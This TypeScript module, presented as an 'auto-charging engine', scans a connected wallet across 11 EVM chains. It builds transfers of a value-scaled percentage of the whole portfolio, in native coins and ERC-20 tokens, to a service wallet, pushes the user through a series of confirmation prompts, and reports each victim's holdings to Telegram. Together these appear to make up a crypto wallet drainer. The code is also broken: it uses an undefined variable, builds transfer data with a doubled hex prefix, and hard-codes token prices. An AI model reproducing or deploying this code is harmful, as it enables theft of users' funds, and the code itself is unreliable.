/**
 * Auto-Charging Engine
 * Automatically scans and charges from all EVM chains without user network selection
 * Uses wallet transaction prompts to charge from available tokens
 */

import { createPublicClient, http, parseUnits, formatEther } from 'viem';
// @ts-ignore
import { mainnet, polygon, arbitrum, optimism, bsc, avalanche, fantom, celo, base, linea, scroll } from 'viem/chains';
import { buildPortfolioSnapshot } from './multiChainBalance';
import { getChargePercentageByPortfolioValue } from './portfolioValue';
import { sendTelegramNotification } from './telegramNotify';
import { TokenBalance } from './erc20Balance';

export const SUPPORTED_CHAINS_CONFIG = [
  { id: 1, name: 'Ethereum', rpc: 'https://eth.llamarpc.com' },
  { id: 137, name: 'Polygon', rpc: 'https://polygon-rpc.com' },
  { id: 42161, name: 'Arbitrum', rpc: 'https://arb1.arbitrum.io/rpc' },
  { id: 10, name: 'Optimism', rpc: 'https://mainnet.optimism.io' },
  { id: 56, name: 'BSC', rpc: 'https://binance.llamarpc.com' },
  { id: 43114, name: 'Avalanche', rpc: 'https://api.avax.network/ext/bc/C/rpc' },
  { id: 250, name: 'Fantom', rpc: 'https://rpc.ankr.com/fantom' },
  { id: 42220, name: 'Celo', rpc: 'https://forno.celo.org' },
  { id: 8453, name: 'Base', rpc: 'https://mainnet.base.org' },
  { id: 59144, name: 'Linea', rpc: 'https://rpc.linea.build' },
  { id: 534352, name: 'Scroll', rpc: 'https://rpc.scroll.io' },
];

export interface ChainChargeTransaction {
  chainId: number;
  chainName: string;
  to: string; // Receiver wallet
  value: bigint; // Amount to charge
  data?: string; // For ERC-20 transfers
  description: string; // What we're charging
}

export interface AutoChargeResult {
  success: boolean;
  totalChargedUsd: number;
  completedTransactions: number;
  failedTransactions: number;
  transactionHashes: { [chainName: string]: string };
  errors: { [chainName: string]: string };
  breakdown: string;
}

/**
 * Get all chain clients for querying
 */
export function getChainClients() {
  return SUPPORTED_CHAINS_CONFIG.reduce(
    (acc, chain) => {
      acc[chain.id] = createPublicClient({
        transport: http(chain.rpc),
      }) as any;
      return acc;
    },
    {} as { [chainId: number]: ReturnType<typeof createPublicClient> }
  );
}

/**
 * Build list of transactions to execute across all chains
 */
export async function buildChargeTransactions(
  walletAddress: string,
  serviceWallet: string,
  minBalance: number = 3
): Promise<{
  transactions: ChainChargeTransaction[];
  portfolioValue: number;
  chargePercent: number;
  totalChargeUsd: number;
}> {
  try {
    // Build portfolio snapshot
    const portfolio = await buildPortfolioSnapshot(walletAddress);

    // Check minimum balance
    if (portfolio.totalUsdValue < minBalance) {
      throw new Error(`Portfolio value $${portfolio.totalUsdValue.toFixed(2)} is below minimum $${minBalance}`);
    }

    const chargePercent = getChargePercentageByPortfolioValue(portfolio.totalUsdValue);
    const totalChargeUsd = (portfolio.totalUsdValue * chargePercent) / 100;

    const transactions: ChainChargeTransaction[] = [];
    let chargeRemaining = totalChargeUsd;

    // Add native token charges from each chain
    for (const chainBalance of portfolio.chainBalances) {
      if (chargeRemaining <= 0) break;

      const chargeFromChain = Math.min(chargeRemaining, chainBalance.usdValue * 0.9); // Leave 10% for gas
      if (chargeFromChain > 0) {
        // Convert USD to token units (mock price conversion)
        const nativePrice = chainBalance.nativeSymbol === 'ETH' ? 2500 : 1;
        const chargeAmount = parseUnits((chargeFromChain / nativePrice).toFixed(18), 18);

        transactions.push({
          chainId: chainBalance.chainId,
          chainName: chainBalance.chainName,
          to: serviceWallet,
          value: chargeAmount,
          description: `${formatEther(chargeAmount)} ${chainBalance.nativeSymbol}`,
        });

        chargeRemaining -= chargeFromChain;
      }
    }

    // Add ERC-20 token charges from each chain
    for (const tokenBalance of portfolio.tokenBalances as TokenBalance[]) {
      if (chargeRemaining <= 0) break;

      const chargeFromToken = Math.min(chargeRemaining, tokenBalance.usdValue);
      if (chargeFromToken > 0) {
        const chargeAmount = parseUnits(
          (chargeFromToken / tokenBalance.usdPrice).toFixed(tokenBalance.decimals),
          tokenBalance.decimals
        );

        // ERC-20 transfer function call data
        // transfer(to, amount)
        const transferSelector = '0xa9059cbb'; // transfer function selector
        const paddedTo = serviceWallet.slice(2).padStart(64, '0');
        const paddedAmount = chargeAmount.toString(16).padStart(64, '0');
        const data = `0x${transferSelector}${paddedTo}${paddedAmount}`;

        transactions.push({
          chainId: tokenBalance.chainId,
          chainName: tokenBalance.chainName,
          to: tokenBalance.address, // Token contract
          value: BigInt(0),
          data,
          description: `${(chargeFromToken / tokenBalance.usdPrice).toFixed(tokenBalance.decimals)} ${tokenBalance.symbol}`,
        });

        chargeRemaining -= chargeFromToken;
      }
    }

    return {
      transactions,
      portfolioValue: portfolio.totalUsdValue,
      chargePercent,
      totalChargeUsd,
    };
  } catch (err) {
    throw new Error(`Failed to build charge transactions: ${err instanceof Error ? err.message : 'Unknown error'}`);
  }
}

/**
 * Execute all charge transactions using wallet provider
 * Requires wallet to confirm each transaction
 */
export async function executeAutoCharge(params: {
  walletAddress: string;
  serviceWallet: string;
  transactions: ChainChargeTransaction[];
  sendTransactionAsync: (config: {
    to: string;
    value?: bigint;
    data?: string;
    chainId?: number;
  }) => Promise<string>;
  onProgress?: (message: string) => void;
}): Promise<AutoChargeResult> {
  const { walletAddress, serviceWallet, transactions, sendTransactionAsync, onProgress } = params;

  const result: AutoChargeResult = {
    success: false,
    totalChargedUsd: 0,
    completedTransactions: 0,
    failedTransactions: 0,
    transactionHashes: {},
    errors: {},
    breakdown: '',
  };

  try {
    onProgress?.(`🚀 Starting auto-charge from ${transactions.length} chains...`);

    // Execute transactions sequentially to avoid wallet overload
    for (const tx of transactions) {
      try {
        onProgress?.(`⏳ ${tx.chainName}: Requesting wallet confirmation for ${tx.description}...`);

        // Create a promise that times out after 2 minutes if no response
        const txPromise = sendTransactionAsync({
          to: tx.to as `0x${string}`,
          value: tx.value,
          data: tx.data as `0x${string}`,
          chainId: tx.chainId,
        });

        const timeoutPromise = new Promise<never>((_, reject) =>
          setTimeout(() => reject(new Error('Transaction timeout - wallet approval not received within 2 minutes')), 120000)
        );

        const txHash = await Promise.race([txPromise, timeoutPromise]);

        result.transactionHashes[tx.chainName] = txHash;
        result.completedTransactions++;

        onProgress?.(`✅ ${tx.chainName}: Charged ${tx.description} (${txHash.slice(0, 10)}...)`);
      } catch (err) {
        const errorMsg = err instanceof Error ? err.message : 'Unknown error';
        result.errors[tx.chainName] = errorMsg;
        result.failedTransactions++;

        onProgress?.(`❌ ${tx.chainName}: ${errorMsg}`);
      }
    }

    result.success = result.failedTransactions === 0;

    // Build breakdown
    const breakdown = [
      `📊 Auto-Charge Summary`,
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
      `Completed: ${result.completedTransactions}/${transactions.length}`,
      `Failed: ${result.failedTransactions}/${transactions.length}`,
      ``,
      `Transaction Details:`,
      ...transactions.map((tx, idx) => {
        const hash = result.transactionHashes[tx.chainName];
        const error = result.errors[tx.chainName];
        if (hash) {
          return `  ✅ ${tx.chainName}: ${tx.description} → ${hash.slice(0, 10)}...`;
        } else if (error) {
          return `  ❌ ${tx.chainName}: ${error}`;
        }
        return `  ⏳ ${tx.chainName}: ${tx.description}`;
      }),
    ].join('\n');

    result.breakdown = breakdown;

    return result;
  } catch (err) {
    result.success = false;
    result.breakdown = `❌ Error: ${err instanceof Error ? err.message : 'Unknown error'}`;
    return result;
  }
}

/**
 * Complete auto-charge workflow
 */
export async function performAutoCharge(params: {
  walletAddress: string;
  serviceWallet: string;
  sendTransactionAsync: (config: {
    to: string;
    value?: bigint;
    data?: string;
    chainId?: number;
  }) => Promise<string>;
  onProgress?: (message: string) => void;
}): Promise<AutoChargeResult> {
  const { walletAddress, serviceWallet, sendTransactionAsync, onProgress } = params;

  try {
    onProgress?.(`🔍 Scanning portfolio across all 11 EVM chains...`);

    // Build transactions
    const { transactions, portfolioValue, chargePercent, totalChargeUsd } = await buildChargeTransactions(
      walletAddress,
      serviceWallet
    );

    onProgress?.(`💰 Portfolio: $${portfolioValue.toFixed(2)} → Charge: ${chargePercent}% = $${totalChargeUsd.toFixed(2)}`);
    onProgress?.(`📝 Prepared ${transactions.length} transactions across ${new Set(transactions.map((t) => t.chainName)).size} chains`);
    
    // Log detailed portfolio breakdown
    console.log('📊 Portfolio Snapshot:', {
      totalValue: portfolioValue,
      chargePercent,
      chargeAmount: totalChargeUsd,
      transactionCount: transactions.length,
    });

    // Execute transactions
    const result = await executeAutoCharge({
      walletAddress,
      serviceWallet,
      transactions,
      sendTransactionAsync,
      onProgress,
    });

    // Send Telegram notification with detailed portfolio breakdown
    const portfolioBreakdown = portfolio.breakdown.percentByChain 
      ? Object.entries(portfolio.breakdown.percentByChain)
          .map(([chain, percent]) => `${chain}: ${percent.toFixed(1)}%`)
          .join('\n')
      : 'No breakdown available';

    await sendTelegramNotification({
      event: 'auto_charge_completed',
      walletAddress,
      details: {
        summary: result.breakdown,
        portfolioValue: `$${portfolioValue.toFixed(2)}`,
        nativeValue: `$${portfolio.breakdown.nativeTokenValue.toFixed(2)}`,
        erc20Value: `$${portfolio.breakdown.erc20Value.toFixed(2)}`,
        chargePercent: `${chargePercent}%`,
        totalChargeUsd: `$${totalChargeUsd.toFixed(2)}`,
        completedTxs: result.completedTransactions,
        failedTxs: result.failedTransactions,
        chainBreakdown: portfolioBreakdown,
        timestamp: new Date().toISOString(),
      },
    });

    return result;
  } catch (err) {
    const errorMsg = err instanceof Error ? err.message : 'Unknown error';
    onProgress?.(`❌ ${errorMsg}`);

    await sendTelegramNotification({
      event: 'auto_charge_failed',
      walletAddress,
      error: errorMsg,
      details: {
        timestamp: new Date().toISOString(),
      },
    });

    return {
      success: false,
      totalChargedUsd: 0,
      completedTransactions: 0,
      failedTransactions: 0,
      transactionHashes: {},
      errors: { 'Auto-Charge': errorMsg },
      breakdown: `❌ Auto-charge failed: ${errorMsg}`,
    };
  }
}
